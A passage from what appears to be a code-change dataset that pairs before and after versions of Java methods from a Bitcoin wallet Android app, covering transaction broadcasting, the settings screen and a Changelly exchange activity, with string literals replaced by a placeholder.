  if (CommunicationManager.getInstance(getApplicationContext()).getPairedModules().contains(GooglePlayModuleCollection.getModules(getApplicationContext()).get(""String_Node_Str""))) {
    Intent intent=IntentContract.BroadcastTransaction.createIntent(_transaction.toBytes());
    WalletApplication.sendToSpv(intent,_mbwManager.getSelectedAccount().getType());
    return WalletAccount.BroadcastResult.SUCCESS;
  }
  return _account.broadcastTransaction(_transaction);
}"
91117,"private AsyncTask<Void,Integer,WalletAccount.BroadcastResult> startBroadcastingTask(){
  AsyncTask<Void,Integer,WalletAccount.BroadcastResult> task=new AsyncTask<Void,Integer,WalletAccount.BroadcastResult>(){
    @Override protected WalletAccount.BroadcastResult doInBackground(    Void... args){
      if (CommunicationManager.getInstance(getApplicationContext()).getPairedModules().contains(GooglePlayModuleCollection.INSTANCE.getModules(getApplicationContext()).get(""String_Node_Str""))) {
        Intent intent=IntentContract.BroadcastTransaction.createIntent(_transaction.toBytes());
        WalletApplication.sendToSpv(intent,_mbwManager.getSelectedAccount().getType());
        return WalletAccount.BroadcastResult.SUCCESS;
      }
      return _account.broadcastTransaction(_transaction);
    }
    @Override protected void onPostExecute(    WalletAccount.BroadcastResult result){
      _broadcastResult=result;
      showResult();
    }
  }
;
  task.execute();
  return task;
}","private AsyncTask<Void,Integer,WalletAccount.BroadcastResult> startBroadcastingTask(){
  AsyncTask<Void,Integer,WalletAccount.BroadcastResult> task=new AsyncTask<Void,Integer,WalletAccount.BroadcastResult>(){
    @Override protected WalletAccount.BroadcastResult doInBackground(    Void... args){
      if (CommunicationManager.getInstance(getApplicationContext()).getPairedModules().contains(GooglePlayModuleCollection.getModules(getApplicationContext()).get(""String_Node_Str""))) {
        Intent intent=IntentContract.BroadcastTransaction.createIntent(_transaction.toBytes());
        WalletApplication.sendToSpv(intent,_mbwManager.getSelectedAccount().getType());
        return WalletAccount.BroadcastResult.SUCCESS;
      }
      return _account.broadcastTransaction(_transaction);
    }
    @Override protected void onPostExecute(    WalletAccount.BroadcastResult result){
      _broadcastResult=result;
      showResult();
    }
  }
;
  task.execute();
  return task;
}"
91118,"@SuppressWarnings(""String_Node_Str"") @Override public void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  addPreferencesFromResource(R.xml.preferences);
  _mbwManager=MbwManager.getInstance(SettingsActivity.this.getApplication());
  _ltManager=_mbwManager.getLocalTraderManager();
  _bitcoinDenomination=(ListPreference)findPreference(""String_Node_Str"");
  _bitcoinDenomination.setTitle(bitcoinDenominationTitle());
  _bitcoinDenomination.setDefaultValue(_mbwManager.getBitcoinDenomination().toString());
  _bitcoinDenomination.setValue(_mbwManager.getBitcoinDenomination().toString());
  CharSequence[] denominations=new CharSequence[]{Denomination.BTC.toString(),Denomination.mBTC.toString(),Denomination.uBTC.toString(),Denomination.BITS.toString()};
  _bitcoinDenomination.setEntries(denominations);
  _bitcoinDenomination.setEntryValues(denominations);
  _bitcoinDenomination.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.setBitcoinDenomination(Denomination.fromString(newValue.toString()));
      _bitcoinDenomination.setTitle(bitcoinDenominationTitle());
      return true;
    }
  }
);
  _minerFee=(ListPreference)findPreference(""String_Node_Str"");
  _minerFee.setTitle(getMinerFeeTitle());
  _minerFee.setSummary(getMinerFeeSummary());
  _minerFee.setValue(_mbwManager.getMinerFee().toString());
  CharSequence[] minerFees=new CharSequence[]{MinerFee.LOWPRIO.toString(),MinerFee.ECONOMIC.toString(),MinerFee.NORMAL.toString(),MinerFee.PRIORITY.toString()};
  CharSequence[] minerFeeNames=new CharSequence[]{getString(R.string.miner_fee_lowprio_name),getString(R.string.miner_fee_economic_name),getString(R.string.miner_fee_normal_name),getString(R.string.miner_fee_priority_name)};
  _minerFee.setEntries(minerFeeNames);
  _minerFee.setEntryValues(minerFees);
  _minerFee.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.setMinerFee(MinerFee.fromString(newValue.toString()));
      _minerFee.setTitle(getMinerFeeTitle());
      _minerFee.setSummary(getMinerFeeSummary());
      String description=_mbwManager.getMinerFee().getMinerFeeDescription(SettingsActivity.this);
      Utils.showSimpleMessageDialog(SettingsActivity.this,description);
      return true;
    }
  }
);
  _blockExplorer=(ListPreference)findPreference(""String_Node_Str"");
  _blockExplorer.setTitle(getBlockExplorerTitle());
  _blockExplorer.setSummary(getBlockExplorerSummary());
  _blockExplorer.setValue(_mbwManager._blockExplorerManager.getBlockExplorer().getIdentifier());
  CharSequence[] blockExplorerNames=_mbwManager._blockExplorerManager.getBlockExplorerNames(_mbwManager._blockExplorerManager.getAllBlockExplorer());
  CharSequence[] blockExplorerValues=_mbwManager._blockExplorerManager.getBlockExplorerIds();
  _blockExplorer.setEntries(blockExplorerNames);
  _blockExplorer.setEntryValues(blockExplorerValues);
  _blockExplorer.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.setBlockExplorer(_mbwManager._blockExplorerManager.getBlockExplorerById(newValue.toString()));
      _blockExplorer.setTitle(getBlockExplorerTitle());
      _blockExplorer.setSummary(getBlockExplorerSummary());
      return true;
    }
  }
);
  _localCurrency=findPreference(""String_Node_Str"");
  _localCurrency.setOnPreferenceClickListener(localCurrencyClickListener);
  _localCurrency.setTitle(localCurrencyTitle());
  _exchangeSource=(ListPreference)findPreference(""String_Node_Str"");
  ExchangeRateManager exchangeManager=_mbwManager.getExchangeRateManager();
  List<String> exchangeSourceNamesList=exchangeManager.getExchangeSourceNames();
  CharSequence[] exchangeNames=exchangeSourceNamesList.toArray(new String[exchangeSourceNamesList.size()]);
  _exchangeSource.setEntries(exchangeNames);
  if (exchangeNames.length == 0) {
    _exchangeSource.setEnabled(false);
  }
 else {
    String currentName=exchangeManager.getCurrentExchangeSourceName();
    if (currentName == null) {
      currentName=""String_Node_Str"";
    }
    _exchangeSource.setEntries(exchangeNames);
    _exchangeSource.setEntryValues(exchangeNames);
    _exchangeSource.setDefaultValue(currentName);
    _exchangeSource.setValue(currentName);
  }
  _exchangeSource.setTitle(exchangeSourceTitle());
  _exchangeSource.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.getExchangeRateManager().setCurrentExchangeSourceName(newValue.toString());
      _exchangeSource.setTitle(exchangeSourceTitle());
      return true;
    }
  }
);
  ListPreference language=(ListPreference)findPreference(Constants.LANGUAGE_SETTING);
  language.setTitle(getLanguageSettingTitle());
  language.setDefaultValue(Locale.getDefault().getLanguage());
  language.setSummary(_mbwManager.getLanguage());
  language.setValue(_mbwManager.getLanguage());
  ImmutableMap<String,String> languageLookup=loadLanguageLookups();
  language.setSummary(languageLookup.get(_mbwManager.getLanguage()));
  language.setEntries(R.array.languages_desc);
  language.setEntryValues(R.array.languages);
  language.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      String lang=newValue.toString();
      _mbwManager.setLanguage(lang);
      WalletApplication app=(WalletApplication)getApplication();
      app.applyLanguageChange(lang);
      restart();
      return true;
    }
  }
);
  Preference setPin=Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  setPin.setOnPreferenceClickListener(setPinClickListener);
  updateClearPin();
  CheckBoxPreference setPinRequiredStartup=(CheckBoxPreference)Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  setPinRequiredStartup.setOnPreferenceChangeListener(setPinOnStartupClickListener);
  setPinRequiredStartup.setChecked(_mbwManager.getPinRequiredOnStartup());
  Preference legacyBackup=Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  legacyBackup.setOnPreferenceClickListener(legacyBackupClickListener);
  Preference legacyBackupVerify=Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  legacyBackupVerify.setOnPreferenceClickListener(legacyBackupVerifyClickListener);
  CheckBoxPreference ltDisable=(CheckBoxPreference)findPreference(""String_Node_Str"");
  ltDisable.setChecked(_ltManager.isLocalTraderDisabled());
  ltDisable.setOnPreferenceClickListener(ltDisableLocalTraderClickListener);
  _ltNotificationSound=(CheckBoxPreference)findPreference(""String_Node_Str"");
  _ltNotificationSound.setChecked(_ltManager.getPlaySoundOnTradeNotification());
  _ltNotificationSound.setOnPreferenceClickListener(ltNotificationSoundClickListener);
  _ltMilesKilometers=(CheckBoxPreference)findPreference(""String_Node_Str"");
  _ltMilesKilometers.setChecked(_ltManager.useMiles());
  _ltMilesKilometers.setOnPreferenceClickListener(ltMilesKilometersClickListener);
  CheckBoxPreference showBip44Path=(CheckBoxPreference)findPreference(""String_Node_Str"");
  showBip44Path.setChecked(_mbwManager.getMetadataStorage().getShowBip44Path());
  showBip44Path.setOnPreferenceClickListener(showBip44PathClickListener);
  final ListPreference useTor=Preconditions.checkNotNull((ListPreference)findPreference(""String_Node_Str""));
  useTor.setTitle(getUseTorTitle());
  useTor.setEntries(new String[]{getString(R.string.use_https),getString(R.string.use_external_tor)});
  useTor.setEntryValues(new String[]{ServerEndpointType.Types.ONLY_HTTPS.toString(),ServerEndpointType.Types.ONLY_TOR.toString()});
  useTor.setValue(_mbwManager.getTorMode().toString());
  useTor.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      if (newValue.equals(ServerEndpointType.Types.ONLY_TOR.toString())) {
        OrbotHelper obh=new OrbotHelper(SettingsActivity.this);
        if (!obh.isOrbotInstalled()) {
          obh.promptToInstall(SettingsActivity.this);
        }
      }
      _mbwManager.setTorMode(ServerEndpointType.Types.valueOf((String)newValue));
      useTor.setTitle(getUseTorTitle());
      return true;
    }
  }
);
  CheckBoxPreference ledgerDisableTee=(CheckBoxPreference)findPreference(""String_Node_Str"");
  Preference ledgerSetUnpluggedAID=findPreference(""String_Node_Str"");
  boolean isTeeAvailable=LedgerTransportTEEProxyFactory.isServiceAvailable(this);
  if (isTeeAvailable) {
    ledgerDisableTee.setChecked(_mbwManager.getLedgerManager().getDisableTEE());
    ledgerDisableTee.setOnPreferenceClickListener(onClickLedgerNotificationDisableTee);
  }
 else {
    PreferenceCategory ledger=(PreferenceCategory)findPreference(""String_Node_Str"");
    ledger.removePreference(ledgerDisableTee);
  }
  ledgerSetUnpluggedAID.setOnPreferenceClickListener(onClickLedgerSetUnpluggedAID);
  applyLocalTraderEnablement();
  initExternalSettings();
  PreferenceCategory modulesPrefs=(PreferenceCategory)findPreference(""String_Node_Str"");
  if (!CommunicationManager.getInstance(this).getPairedModules().isEmpty()) {
    for (    final Module module : CommunicationManager.getInstance(this).getPairedModules()) {
      Preference preference=new Preference(this);
      preference.setLayoutResource(R.layout.preference_layout);
      preference.setTitle(Html.fromHtml(module.getName()));
      preference.setSummary(module.getDescription());
      preference.setOnPreferenceClickListener(new OnPreferenceClickListener(){
        @Override public boolean onPreferenceClick(        Preference preference){
          Intent intent=new Intent(com.mycelium.modularizationtools.Constants.Companion.getSETTINGS());
          intent.setPackage(module.getModulePackage());
          startActivity(intent);
          return true;
        }
      }
);
      modulesPrefs.addPreference(preference);
    }
  }
 else {
    Preference preference=new Preference(this);
    preference.setTitle(R.string.no_connected_modules);
    modulesPrefs.addPreference(preference);
  }
  for (  final Module module : GooglePlayModuleCollection.INSTANCE.getModules(this).values()) {
    if (!CommunicationManager.getInstance(this).getPairedModules().contains(module)) {
      ButtonPreference installPreference=new ButtonPreference(this);
      installPreference.setButtonText(getString(R.string.install));
      installPreference.setButtonClickListener(new View.OnClickListener(){
        @Override public void onClick(        View view){
          Intent installIntent=new Intent(Intent.ACTION_VIEW);
          installIntent.setData(Uri.parse(""String_Node_Str"" + module.getModulePackage()));
          startActivity(installIntent);
        }
      }
);
      installPreference.setTitle(Html.fromHtml(module.getName()));
      installPreference.setSummary(module.getDescription());
      modulesPrefs.addPreference(installPreference);
    }
  }
}","@SuppressWarnings(""String_Node_Str"") @Override public void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  addPreferencesFromResource(R.xml.preferences);
  _mbwManager=MbwManager.getInstance(SettingsActivity.this.getApplication());
  _ltManager=_mbwManager.getLocalTraderManager();
  _bitcoinDenomination=(ListPreference)findPreference(""String_Node_Str"");
  _bitcoinDenomination.setTitle(bitcoinDenominationTitle());
  _bitcoinDenomination.setDefaultValue(_mbwManager.getBitcoinDenomination().toString());
  _bitcoinDenomination.setValue(_mbwManager.getBitcoinDenomination().toString());
  CharSequence[] denominations=new CharSequence[]{Denomination.BTC.toString(),Denomination.mBTC.toString(),Denomination.uBTC.toString(),Denomination.BITS.toString()};
  _bitcoinDenomination.setEntries(denominations);
  _bitcoinDenomination.setEntryValues(denominations);
  _bitcoinDenomination.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.setBitcoinDenomination(Denomination.fromString(newValue.toString()));
      _bitcoinDenomination.setTitle(bitcoinDenominationTitle());
      return true;
    }
  }
);
  _minerFee=(ListPreference)findPreference(""String_Node_Str"");
  _minerFee.setTitle(getMinerFeeTitle());
  _minerFee.setSummary(getMinerFeeSummary());
  _minerFee.setValue(_mbwManager.getMinerFee().toString());
  CharSequence[] minerFees=new CharSequence[]{MinerFee.LOWPRIO.toString(),MinerFee.ECONOMIC.toString(),MinerFee.NORMAL.toString(),MinerFee.PRIORITY.toString()};
  CharSequence[] minerFeeNames=new CharSequence[]{getString(R.string.miner_fee_lowprio_name),getString(R.string.miner_fee_economic_name),getString(R.string.miner_fee_normal_name),getString(R.string.miner_fee_priority_name)};
  _minerFee.setEntries(minerFeeNames);
  _minerFee.setEntryValues(minerFees);
  _minerFee.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.setMinerFee(MinerFee.fromString(newValue.toString()));
      _minerFee.setTitle(getMinerFeeTitle());
      _minerFee.setSummary(getMinerFeeSummary());
      String description=_mbwManager.getMinerFee().getMinerFeeDescription(SettingsActivity.this);
      Utils.showSimpleMessageDialog(SettingsActivity.this,description);
      return true;
    }
  }
);
  _blockExplorer=(ListPreference)findPreference(""String_Node_Str"");
  _blockExplorer.setTitle(getBlockExplorerTitle());
  _blockExplorer.setSummary(getBlockExplorerSummary());
  _blockExplorer.setValue(_mbwManager._blockExplorerManager.getBlockExplorer().getIdentifier());
  CharSequence[] blockExplorerNames=_mbwManager._blockExplorerManager.getBlockExplorerNames(_mbwManager._blockExplorerManager.getAllBlockExplorer());
  CharSequence[] blockExplorerValues=_mbwManager._blockExplorerManager.getBlockExplorerIds();
  _blockExplorer.setEntries(blockExplorerNames);
  _blockExplorer.setEntryValues(blockExplorerValues);
  _blockExplorer.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.setBlockExplorer(_mbwManager._blockExplorerManager.getBlockExplorerById(newValue.toString()));
      _blockExplorer.setTitle(getBlockExplorerTitle());
      _blockExplorer.setSummary(getBlockExplorerSummary());
      return true;
    }
  }
);
  _localCurrency=findPreference(""String_Node_Str"");
  _localCurrency.setOnPreferenceClickListener(localCurrencyClickListener);
  _localCurrency.setTitle(localCurrencyTitle());
  _exchangeSource=(ListPreference)findPreference(""String_Node_Str"");
  ExchangeRateManager exchangeManager=_mbwManager.getExchangeRateManager();
  List<String> exchangeSourceNamesList=exchangeManager.getExchangeSourceNames();
  CharSequence[] exchangeNames=exchangeSourceNamesList.toArray(new String[exchangeSourceNamesList.size()]);
  _exchangeSource.setEntries(exchangeNames);
  if (exchangeNames.length == 0) {
    _exchangeSource.setEnabled(false);
  }
 else {
    String currentName=exchangeManager.getCurrentExchangeSourceName();
    if (currentName == null) {
      currentName=""String_Node_Str"";
    }
    _exchangeSource.setEntries(exchangeNames);
    _exchangeSource.setEntryValues(exchangeNames);
    _exchangeSource.setDefaultValue(currentName);
    _exchangeSource.setValue(currentName);
  }
  _exchangeSource.setTitle(exchangeSourceTitle());
  _exchangeSource.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      _mbwManager.getExchangeRateManager().setCurrentExchangeSourceName(newValue.toString());
      _exchangeSource.setTitle(exchangeSourceTitle());
      return true;
    }
  }
);
  ListPreference language=(ListPreference)findPreference(Constants.LANGUAGE_SETTING);
  language.setTitle(getLanguageSettingTitle());
  language.setDefaultValue(Locale.getDefault().getLanguage());
  language.setSummary(_mbwManager.getLanguage());
  language.setValue(_mbwManager.getLanguage());
  ImmutableMap<String,String> languageLookup=loadLanguageLookups();
  language.setSummary(languageLookup.get(_mbwManager.getLanguage()));
  language.setEntries(R.array.languages_desc);
  language.setEntryValues(R.array.languages);
  language.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      String lang=newValue.toString();
      _mbwManager.setLanguage(lang);
      WalletApplication app=(WalletApplication)getApplication();
      app.applyLanguageChange(lang);
      restart();
      return true;
    }
  }
);
  Preference setPin=Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  setPin.setOnPreferenceClickListener(setPinClickListener);
  updateClearPin();
  CheckBoxPreference setPinRequiredStartup=(CheckBoxPreference)Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  setPinRequiredStartup.setOnPreferenceChangeListener(setPinOnStartupClickListener);
  setPinRequiredStartup.setChecked(_mbwManager.getPinRequiredOnStartup());
  Preference legacyBackup=Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  legacyBackup.setOnPreferenceClickListener(legacyBackupClickListener);
  Preference legacyBackupVerify=Preconditions.checkNotNull(findPreference(""String_Node_Str""));
  legacyBackupVerify.setOnPreferenceClickListener(legacyBackupVerifyClickListener);
  CheckBoxPreference ltDisable=(CheckBoxPreference)findPreference(""String_Node_Str"");
  ltDisable.setChecked(_ltManager.isLocalTraderDisabled());
  ltDisable.setOnPreferenceClickListener(ltDisableLocalTraderClickListener);
  _ltNotificationSound=(CheckBoxPreference)findPreference(""String_Node_Str"");
  _ltNotificationSound.setChecked(_ltManager.getPlaySoundOnTradeNotification());
  _ltNotificationSound.setOnPreferenceClickListener(ltNotificationSoundClickListener);
  _ltMilesKilometers=(CheckBoxPreference)findPreference(""String_Node_Str"");
  _ltMilesKilometers.setChecked(_ltManager.useMiles());
  _ltMilesKilometers.setOnPreferenceClickListener(ltMilesKilometersClickListener);
  CheckBoxPreference showBip44Path=(CheckBoxPreference)findPreference(""String_Node_Str"");
  showBip44Path.setChecked(_mbwManager.getMetadataStorage().getShowBip44Path());
  showBip44Path.setOnPreferenceClickListener(showBip44PathClickListener);
  final ListPreference useTor=Preconditions.checkNotNull((ListPreference)findPreference(""String_Node_Str""));
  useTor.setTitle(getUseTorTitle());
  useTor.setEntries(new String[]{getString(R.string.use_https),getString(R.string.use_external_tor)});
  useTor.setEntryValues(new String[]{ServerEndpointType.Types.ONLY_HTTPS.toString(),ServerEndpointType.Types.ONLY_TOR.toString()});
  useTor.setValue(_mbwManager.getTorMode().toString());
  useTor.setOnPreferenceChangeListener(new OnPreferenceChangeListener(){
    @Override public boolean onPreferenceChange(    Preference preference,    Object newValue){
      if (newValue.equals(ServerEndpointType.Types.ONLY_TOR.toString())) {
        OrbotHelper obh=new OrbotHelper(SettingsActivity.this);
        if (!obh.isOrbotInstalled()) {
          obh.promptToInstall(SettingsActivity.this);
        }
      }
      _mbwManager.setTorMode(ServerEndpointType.Types.valueOf((String)newValue));
      useTor.setTitle(getUseTorTitle());
      return true;
    }
  }
);
  CheckBoxPreference ledgerDisableTee=(CheckBoxPreference)findPreference(""String_Node_Str"");
  Preference ledgerSetUnpluggedAID=findPreference(""String_Node_Str"");
  boolean isTeeAvailable=LedgerTransportTEEProxyFactory.isServiceAvailable(this);
  if (isTeeAvailable) {
    ledgerDisableTee.setChecked(_mbwManager.getLedgerManager().getDisableTEE());
    ledgerDisableTee.setOnPreferenceClickListener(onClickLedgerNotificationDisableTee);
  }
 else {
    PreferenceCategory ledger=(PreferenceCategory)findPreference(""String_Node_Str"");
    ledger.removePreference(ledgerDisableTee);
  }
  ledgerSetUnpluggedAID.setOnPreferenceClickListener(onClickLedgerSetUnpluggedAID);
  applyLocalTraderEnablement();
  initExternalSettings();
  PreferenceCategory modulesPrefs=(PreferenceCategory)findPreference(""String_Node_Str"");
  if (!CommunicationManager.getInstance(this).getPairedModules().isEmpty()) {
    for (    final Module module : CommunicationManager.getInstance(this).getPairedModules()) {
      Preference preference=new Preference(this);
      preference.setLayoutResource(R.layout.preference_layout);
      preference.setTitle(Html.fromHtml(module.getName()));
      preference.setSummary(module.getDescription());
      preference.setOnPreferenceClickListener(new OnPreferenceClickListener(){
        @Override public boolean onPreferenceClick(        Preference preference){
          Intent intent=new Intent(com.mycelium.modularizationtools.Constants.getSETTINGS());
          intent.setPackage(module.getModulePackage());
          startActivity(intent);
          return true;
        }
      }
);
      modulesPrefs.addPreference(preference);
    }
  }
 else {
    Preference preference=new Preference(this);
    preference.setTitle(R.string.no_connected_modules);
    modulesPrefs.addPreference(preference);
  }
  for (  final Module module : GooglePlayModuleCollection.getModules(this).values()) {
    if (!CommunicationManager.getInstance(this).getPairedModules().contains(module)) {
      ButtonPreference installPreference=new ButtonPreference(this);
      installPreference.setButtonText(getString(R.string.install));
      installPreference.setButtonClickListener(new View.OnClickListener(){
        @Override public void onClick(        View view){
          Intent installIntent=new Intent(Intent.ACTION_VIEW);
          installIntent.setData(Uri.parse(""String_Node_Str"" + module.getModulePackage()));
          startActivity(installIntent);
        }
      }
);
      installPreference.setTitle(Html.fromHtml(module.getName()));
      installPreference.setSummary(module.getDescription());
      modulesPrefs.addPreference(installPreference);
    }
  }
}"
91119,"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
      toLayout.setAlpha(Constants.INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  List<WalletAccount> fromAccounts=new ArrayList<>();
  fromAccounts.addAll(AccountManager.INSTANCE.getBTCBip44Accounts().values());
  fromAccounts.addAll(AccountManager.INSTANCE.getBTCSingleAddressAccounts().values());
  fromAccounts.addAll(AccountManager.INSTANCE.getCoinapultAccounts().values());
  accountAdapter=new AccountAdapter(mbwManager,fromAccounts,firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}","@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  MbwManager mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
      toLayout.setAlpha(Constants.INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  List<WalletAccount> fromAccounts=new ArrayList<>();
  fromAccounts.addAll(AccountManager.INSTANCE.getBTCBip44Accounts().values());
  fromAccounts.addAll(AccountManager.INSTANCE.getBTCSingleAddressAccounts().values());
  fromAccounts.addAll(AccountManager.INSTANCE.getCoinapultAccounts().values());
  accountAdapter=new AccountAdapter(mbwManager,fromAccounts,firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}"
91120,"private void setLayout(ChangellyUITypes uiType){
  findViewById(R.id.llChangellyValidationWait).setVisibility(View.GONE);
  findViewById(R.id.llChangellyLoadingProgress).setVisibility(View.GONE);
  findViewById(R.id.llChangellyErrorWrapper).setVisibility(View.GONE);
  findViewById(R.id.llChangellyMain).setVisibility(View.GONE);
switch (uiType) {
case Loading:
    findViewById(R.id.llChangellyValidationWait).setVisibility(View.VISIBLE);
  break;
case RetryLater:
findViewById(R.id.llChangellyErrorWrapper).setVisibility(View.VISIBLE);
case Main:
findViewById(R.id.llChangellyMain).setVisibility(View.VISIBLE);
}
}","private void setLayout(ChangellyUITypes uiType){
  llChangellyValidationWait.setVisibility(View.GONE);
  llChangellyLoadingProgress.setVisibility(View.GONE);
  llChangellyErrorWrapper.setVisibility(View.GONE);
  llChangellyMain.setVisibility(View.GONE);
switch (uiType) {
case Loading:
    llChangellyValidationWait.setVisibility(View.VISIBLE);
  break;
case RetryLater:
llChangellyErrorWrapper.setVisibility(View.VISIBLE);
case Main:
llChangellyMain.setVisibility(View.VISIBLE);
}
}"
91121,"@OnClick(R.id.buttonContinue) void createAndSignTransaction(){
  long fromValue=ExactBitcoinCashValue.from(BigDecimal.valueOf(offer.amountFrom)).getLongValue();
  try {
    StandardTransactionBuilder.UnsignedTransaction unsignedTransaction=fromAccount.createUnsignedTransaction(Arrays.asList(new WalletAccount.Receiver(Address.fromString(offer.payinAddress),fromValue)),MINER_FEE);
    Transaction transaction=fromAccount.signTransaction(unsignedTransaction,AesKeyCipher.defaultKeyCipher());
    WalletAccount account=mbwManager.getSelectedAccount();
    Intent intent=IntentContract.BroadcastTransaction.createIntent(transaction.toBytes());
    WalletApplication.sendToSpv(intent,account.getType());
  }
 catch (  UnableToBuildTransactionException|InsufficientFundsException|OutputTooSmallException|KeyCipher.InvalidKeyCipher e) {
    e.printStackTrace();
  }
